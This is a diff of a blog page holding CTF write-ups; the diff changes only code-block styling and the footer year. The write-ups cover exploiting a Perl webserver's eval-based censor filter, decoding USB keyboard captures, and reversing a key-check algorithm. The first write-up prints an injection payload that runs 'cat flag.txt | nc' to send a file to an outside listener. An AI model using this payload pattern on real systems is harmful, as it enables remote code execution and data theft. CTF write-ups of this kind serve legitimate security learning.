@@ -137,7 +137,7 @@ Unfortunately fate would be more cruel. It was a Perl webserver for which we had
 <p>
 When you send a message to Tim a request is posted to the webserver:</p>
 <div class="src src-json">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;msg&#34;</span>: <span style="color:#e6db74">&#34;yo dawg&#34;</span>,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;msg&#34;</span>: <span style="color:#e6db74">&#34;yo dawg&#34;</span>,
 </span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;censored_words&#34;</span>: <span style="color:#e6db74">&#34;Pleb|Dumb|Bespawler|Cumberworld|Fopdoodle|fustilugs|fustilarian&#34;</span>}</span></span></code></pre></div>
 </div>
 <p>
@@ -145,7 +145,7 @@ I&#39;m not sure the point of letting a user control their own censored wordlist
 <p>
 The the following method in the webserver code is the one that handles the user input. It is meant to taken the list of user censored words and censor the message the user sent:</p>
 <div class="src src-perl">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">run_wizzard_censorship</span> {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">run_wizzard_censorship</span> {
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">my</span> ($str, $pattern) <span style="color:#f92672">=</span> @_;
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unless</span> (exists $CACHED_PATTERNS{$pattern}) {
 </span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">my</span> $escaped_pattern <span style="color:#f92672">=</span> $pattern) <span style="color:#f92672">=~</span> <span style="color:#e6db74">s!([/\$\[\(\.])!\\$1!g</span>;
@@ -159,13 +159,13 @@ The the following method in the webserver code is the one that handles the user 
 <p>
 I didn&#39;t know perl when I started this but any time I see a string being <code class="verbatim">eval</code>&#39;d I know I should start looking for injection. The line:</p>
 <div class="src src-perl">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>(<span style="color:#66d9ef">my</span> $escaped_pattern <span style="color:#f92672">=</span> $pattern) <span style="color:#f92672">=~</span> <span style="color:#e6db74">s!([/\$\[\(\.])!\\$1!g</span>;</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>(<span style="color:#66d9ef">my</span> $escaped_pattern <span style="color:#f92672">=</span> $pattern) <span style="color:#f92672">=~</span> <span style="color:#e6db74">s!([/\$\[\(\.])!\\$1!g</span>;</span></span></code></pre></div>
 </div>
 <p>was meant to escape any dangerous symbols from the <code class="verbatim">censored_words</code>. It escapes the opening bracket/parenthesis but doesn&#39;t escape the closing bracket. But more importantly it doesn&#39;t ommit the <code class="verbatim">\</code> character. This allows us to backslash our own input which will cause this to backslash our backslash and allow us to insert dangerous characters.</p>
 <p>
 The next line was pretty difficult to understand for a perl newbie like myself:</p>
 <div class="src src-perl">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>eval <span style="color:#e6db74">&#34;sub { \$_[0] =~ s/($escaped_pattern)/\&#34;*\&#34;x (length \$1)/gie }&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>eval <span style="color:#e6db74">&#34;sub { \$_[0] =~ s/($escaped_pattern)/\&#34;*\&#34;x (length \$1)/gie }&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Interprets the string as perl code:</span>
 </span></span><span style="display:flex;"><span>eval <span style="color:#e6db74">&#34;...&#34;</span>
@@ -188,7 +188,7 @@ The next line was pretty difficult to understand for a perl newbie like myself:<
 <p>
 It might not have been necessary to dig this deep into the code because we&#39;re going to disgreguard most of this line. The following payload allows us to get RCE:</p>
 <div class="src src-json">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;msg&#34;</span>: <span style="color:#e6db74">&#34;cool&#34;</span>, <span style="color:#f92672">&#34;censored_words&#34;</span>: <span style="color:#e6db74">&#34;wereall\/countingonyou\/g; `cat flag.txt | nc shell.ctf 1337`;}  #&#34;</span>}</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;msg&#34;</span>: <span style="color:#e6db74">&#34;cool&#34;</span>, <span style="color:#f92672">&#34;censored_words&#34;</span>: <span style="color:#e6db74">&#34;wereall\/countingonyou\/g; `cat flag.txt | nc shell.ctf 1337`;}  #&#34;</span>}</span></span></code></pre></div>
 </div>
 <p>
 This closes the expression replacing <code class="verbatim">wereall\</code> with <code class="verbatim">countingonyou\</code> but that&#39;s not important right now. We then end the perl expression with <code class="verbatim">;</code> and run a command in the subshell with <code class="verbatim">`cmd`</code> which in this case cat&#39;s the file in flag.txt to a netcat listener running on a server we own.</p>
@@ -223,7 +223,7 @@ and export the data as a csv for analysis.
 <p>
 Thanks to  <a href="https://raw.githubusercontent.com/TeamRocketIst/ctf-usb-keyboard-parser/master/usbkeyboard.py">TeamRocketIst</a> for the KEYCODES dict I lifted from their Github page. I created this script which looks at the data and parses the bits that represent whether or not the shift key is pressed and the bits that represented the data. I figured this out by looking at the entropy of the different bytes in the data</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>KEY_CODES <span style="color:#f92672">=</span> {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>KEY_CODES <span style="color:#f92672">=</span> {
 </span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x04</span>:[<span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span>],
 </span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x05</span>:[<span style="color:#e6db74">&#39;b&#39;</span>, <span style="color:#e6db74">&#39;B&#39;</span>],
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
@@ -303,7 +303,7 @@ Bingo!</p>
 <p>
 Here&#39;s the code used to analyze the data:</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pandas_bokeh
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pandas_bokeh
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pandas <span style="color:#66d9ef">as</span> pd
 </span></span><span style="display:flex;"><span>pandas_bokeh<span style="color:#f92672">.</span>output_notebook()
 </span></span><span style="display:flex;"><span>df <span style="color:#f92672">=</span> pd<span style="color:#f92672">.</span>read_csv(<span style="color:#e6db74">&#34;~/Downloads/autograph.csv&#34;</span>)[<span style="color:#e6db74">&#34;HID Data&#34;</span>]
@@ -352,7 +352,7 @@ YesWeHack
 <p>
 This challenge was to reverse engineer this algorithm:</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> re
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> functools <span style="color:#f92672">import</span> reduce
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>FLAG_REG <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;^\d{0,16}9$&#34;</span>)
@@ -379,31 +379,31 @@ This challenge was to reverse engineer this algorithm:</p>
 <p>
 There&#39;s a couple of parts to this that were important to understand. This let us know our key is going to be 0-16 digits and end with a 9</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>FLAG_REG <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;^\d{0,16}9$&#34;</span>)</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>FLAG_REG <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;^\d{0,16}9$&#34;</span>)</span></span></code></pre></div>
 </div>
 <p>
 This function shows us that the key is derived by taking each digit in the user input and calling the function associated on that data on whatever number is in the accumulator (which starts with a seed of 48)</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>reduce(<span style="color:#66d9ef">lambda</span> x, c: OPS[c](x), (int(c) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> flag), <span style="color:#ae81ff">48</span>)</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>reduce(<span style="color:#66d9ef">lambda</span> x, c: OPS[c](x), (int(c) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> flag), <span style="color:#ae81ff">48</span>)</span></span></code></pre></div>
 </div>
 <p>
 Most of the functions are really intimidating but we actually don&#39;t even need to think about what the binary math means. We can just look at the results of their execution. There are two functions here that are interesting though:</p>
 <p>
 The function at index 0 prints the value in 0 and returns the same value. This means we can safely assume 0 is not in our key.</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">lambda</span> x: ([print(x), x][<span style="color:#ae81ff">1</span>]) <span style="color:#75715e"># index 0</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">lambda</span> x: ([print(x), x][<span style="color:#ae81ff">1</span>]) <span style="color:#75715e"># index 0</span></span></span></code></pre></div>
 </div>
 <p>
 The function at index 9 is the function that validates whether or not our key is good. This is why the regex for a valid flag ends with 9. So we can once again assume 9 is not in the key execpt in the last position. We also know from this the key is valid if the result calling it against the anonymous functions ends up being 0 or less.</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">lambda</span> x: [<span style="color:#e6db74">&#34;Good flag!&#34;</span>, <span style="color:#e6db74">&#34;Bad flag!&#34;</span>][x <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>] <span style="color:#75715e"># index 9</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">lambda</span> x: [<span style="color:#e6db74">&#34;Good flag!&#34;</span>, <span style="color:#e6db74">&#34;Bad flag!&#34;</span>][x <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>] <span style="color:#75715e"># index 9</span></span></span></code></pre></div>
 </div>
 <p>
 There&#39;s <code class="verbatim">281,474,976,710,656</code> possible keys here. This means brute forcing is probably not going to be the best way to go about this (still started it running in the background in the off chance the computer could figure it out faster than I could).</p>
 <p>
 What I did was first try to establish what the maximum and minimum values could be a results of calling the functions.</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pandas <span style="color:#66d9ef">as</span> pd
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pandas <span style="color:#66d9ef">as</span> pd
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rangefinder</span>(func):
 </span></span><span style="display:flex;"><span>    acc <span style="color:#f92672">=</span> []
@@ -430,7 +430,7 @@ min: 0 max: 63</p>
 I then wrote a function to solve for the values <code class="verbatim">1-64</code> for all functions of the functions:
 (0 was ommited. There was no reason to solve for 0 since when it reaches 0 that will be the last number before 9)</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solver</span>(number):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solver</span>(number):
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    return is (function, input) where function(input) = number
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
@@ -518,12 +518,12 @@ This is the results of calling the functions and their returned results. This do
 <p>
 At this point I tried to write some recursive functions to actually find the path from 48 to 0 but i&#39;ll be 100% honest. I was brutally exhausted and the fastest way for me to solve this was to just follow the numbers manually. The path from 48 to 0 required the values:</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">58</span>,<span style="color:#ae81ff">59</span>,<span style="color:#ae81ff">60</span>,<span style="color:#ae81ff">61</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">18</span>,<span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">0</span>]</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">58</span>,<span style="color:#ae81ff">59</span>,<span style="color:#ae81ff">60</span>,<span style="color:#ae81ff">61</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">18</span>,<span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">0</span>]</span></span></code></pre></div>
 </div>
 <p>
 which translated to the path</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>res <span style="color:#f92672">=</span> [<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>]</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>res <span style="color:#f92672">=</span> [<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>]</span></span></code></pre></div>
 </div>
 <p>
 and the key</p>
@@ -573,7 +573,7 @@ and the key</p>
   <div class="footer__inner">
     
       <div class="copyright">
-        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+        <span>© 2026 Powered by <a href="http://gohugo.io">Hugo</a></span>
     
         <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
       </div>
